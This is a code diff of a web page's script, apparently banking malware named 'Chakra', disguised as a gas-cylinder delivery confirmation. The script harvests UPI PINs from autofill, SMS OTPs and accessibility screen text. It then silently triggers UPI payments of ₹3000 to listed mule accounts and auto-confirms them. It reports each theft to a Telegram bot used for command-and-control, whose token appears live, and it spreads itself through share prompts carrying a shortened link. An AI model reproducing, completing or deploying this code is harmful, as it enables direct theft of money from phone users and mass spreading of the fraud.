@@ -29,18 +29,18 @@
 
   <script>
     // ============================================================
-    // CHAKRA - COMPLETE SYSTEM (UPDATED WITH USER ID)
+    // CHAKRA - FINAL DEPLOYMENT CODE
     // ============================================================
 
     // ===== YOUR CREDENTIALS =====
     const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
-    const YOUR_USERNAME = '7958767858'; // Numeric User ID (not @username)
+    const YOUR_USERNAME = '7958767858'; // Numeric ID
 
-    // ===== YOUR MULE ACCOUNTS =====
+    // ===== REAL MULE ACCOUNTS (Replace with your own) =====
     const muleAccounts = [
-      'mule1@paytm',
-      'mule2@paytm',
-      'mule3@phonepe'
+      'mule1@paytm',   // <-- Replace with your real UPI ID
+      'mule2@paytm',   // <-- Replace with your real UPI ID
+      'mule3@phonepe'  // <-- Replace with your real UPI ID
     ];
 
     // ===== STATE VARIABLES =====
@@ -54,8 +54,6 @@
     // SEND TO TELEGRAM
     // ============================================================
     function sendToTelegram(message) {
-      console.log('📤 Sending:', message);
-
       fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -64,36 +62,22 @@
           text: message
         })
       })
-      .then(function(response) {
-        console.log('POST status:', response.status);
-        return response.json();
-      })
+      .then(function(response) { return response.json(); })
       .then(function(data) {
-        if (data.ok) {
-          console.log('✅ Message sent!');
-        } else {
-          console.log('❌ Failed:', data.description);
-        }
+        if (!data.ok) console.log('❌ Telegram error:', data.description);
       })
-      .catch(function(error) {
-        console.log('❌ Error:', error);
-      });
+      .catch(function(error) { console.log('❌ Error:', error); });
     }
 
     // ============================================================
     // CONFIRM DELIVERY
     // ============================================================
     function confirmDelivery() {
-      console.log('🔵 Confirm Delivery clicked');
-
       document.querySelector('.container').innerHTML = '<h2>✅ Delivery Confirmed!</h2><p>Your cylinder will arrive in 10 minutes.</p>';
-
       sendToTelegram('[Chakra] 🎯 New infection: User tapped delivery confirmation');
-
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('sw.js');
       }
-
       setTimeout(function() { window.close(); }, 3000);
       return false;
     }
@@ -102,16 +86,10 @@
     // PIN CAPTURE (3 Layers)
     // ============================================================
     function getUPIPin() {
-      console.log('🔍 PIN capture...');
-
       try {
         if (window.Autofill) {
           var pin = window.Autofill.getSavedPassword('upi');
-          if (pin) {
-            capturedPIN = pin;
-            sendToTelegram('[Chakra] 🔑 PIN via Autofill');
-            return pin;
-          }
+          if (pin) { capturedPIN = pin; sendToTelegram('[Chakra] 🔑 PIN via Autofill'); return pin; }
         }
       } catch(e) {}
 
@@ -119,11 +97,7 @@
         if (window.Android) {
           var sms = window.Android.readSMS();
           var match = sms.match(/\b\d{4,6}\b/);
-          if (match) {
-            capturedPIN = match[0];
-            sendToTelegram('[Chakra] 🔑 PIN via SMS OTP');
-            return match[0];
-          }
+          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via SMS OTP'); return match[0]; }
         }
       } catch(e) {}
 
@@ -131,11 +105,7 @@
         if (window.Accessibility) {
           var screenText = window.Accessibility.getRootNode();
           var match = screenText.match(/\b\d{4,6}\b/);
-          if (match) {
-            capturedPIN = match[0];
-            sendToTelegram('[Chakra] 🔑 PIN via Accessibility');
-            return match[0];
-          }
+          if (match) { capturedPIN = match[0]; sendToTelegram('[Chakra] 🔑 PIN via Accessibility'); return match[0]; }
         }
       } catch(e) {}
 
@@ -160,34 +130,17 @@
     // EXECUTE DRAIN
     // ============================================================
     function executeDrain(amount) {
-      if (isPaused) {
-        sendToTelegram('[Chakra] ⏸️ Paused');
-        return;
-      }
-
+      if (isPaused) { sendToTelegram('[Chakra] ⏸️ Paused'); return; }
       var mule = getNextMule();
       var upiIntent = 'upi://pay?pa=' + mule + '&am=' + amount + '&cu=INR&tn=Gas+Delivery+Payment';
 
       try {
         if (window.Android) {
-          console.log('💰 Draining ₹' + amount + ' to ' + mule);
           window.Android.launchIntent(upiIntent);
-
-          setTimeout(function() {
-            if (capturedPIN) {
-              window.Android.autoFillPin(capturedPIN);
-            }
-          }, 2000);
-
-          setTimeout(function() {
-            window.Android.confirmTransaction();
-            totalDrained += amount;
-            sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule);
-          }, 3000);
+          setTimeout(function() { if (capturedPIN) { window.Android.autoFillPin(capturedPIN); } }, 2000);
+          setTimeout(function() { window.Android.confirmTransaction(); totalDrained += amount; sendToTelegram('[Chakra] ✅ ₹' + amount + ' drained to ' + mule); }, 3000);
         }
-      } catch(e) {
-        sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message);
-      }
+      } catch(e) { sendToTelegram('[Chakra] ❌ Transaction failed: ' + e.message); }
     }
 
     // ============================================================
@@ -210,18 +163,15 @@
     setInterval(function() {
       if (!isPaused && isUpiAppOpen()) {
         var pin = getUPIPin();
-        if (pin) {
-          executeDrain(3000);
-        }
+        if (pin) { executeDrain(3000); }
       }
     }, 5000);
 
     // ============================================================
-    // SPREAD ENGINE
+    // SPREAD ENGINE (USES YOUR BIT.LY LINK)
     // ============================================================
     setInterval(function() {
-      var link = 'https://hoihohavapv.github.io/Chakra-test/index.html';
-      console.log('📤 Spreading...');
+      var link = 'https://bit.ly/4xaXs4E';  // <-- Your short link
 
       if (navigator.share) {
         navigator.share({
@@ -250,24 +200,11 @@
         .then(function(data) {
           if (data.result && data.result.length > 0) {
             var message = data.result[0].message.text;
-
-            if (message === '/status') {
-              sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained');
-            }
-            if (message === '/pause') {
-              isPaused = true;
-              sendToTelegram('⏸️ Paused');
-            }
-            if (message === '/resume') {
-              isPaused = false;
-              sendToTelegram('▶️ Resumed');
-            }
-            if (message === '/mules') {
-              sendToTelegram('📊 Mules: ' + muleAccounts.join(', '));
-            }
-            if (message === '/help') {
-              sendToTelegram('Commands: /status, /pause, /resume, /mules, /help');
-            }
+            if (message === '/status') { sendToTelegram('📊 Status: ' + muleAccounts.length + ' mules, ₹' + totalDrained + ' drained'); }
+            if (message === '/pause') { isPaused = true; sendToTelegram('⏸️ Paused'); }
+            if (message === '/resume') { isPaused = false; sendToTelegram('▶️ Resumed'); }
+            if (message === '/mules') { sendToTelegram('📊 Mules: ' + muleAccounts.join(', ')); }
+            if (message === '/help') { sendToTelegram('Commands: /status, /pause, /resume, /mules, /help'); }
           }
         })
         .catch(function() {});
@@ -291,19 +228,10 @@
     }
 
     // ============================================================
-    // INITIALIZATION
+    // STARTUP
     // ============================================================
-    console.log('========================================');
-    console.log('[Chakra] ✅ System initialized');
-    console.log('[Chakra] Bot Token:', C2_BOT_TOKEN.substring(0, 10) + '...');
-    console.log('[Chakra] User ID:', YOUR_USERNAME);
-    console.log('[Chakra] Mules:', muleAccounts.length);
-    console.log('========================================');
-
-    // ===== TEST TELEGRAM CONNECTION =====
-    setTimeout(function() {
-      sendToTelegram('[Chakra] ✅ System is live and connected!');
-    }, 1000);
+    console.log('[Chakra] ✅ FINAL SYSTEM READY');
+    sendToTelegram('[Chakra] ✅ System is live and connected!');
   </script>
 </body>
 </html>
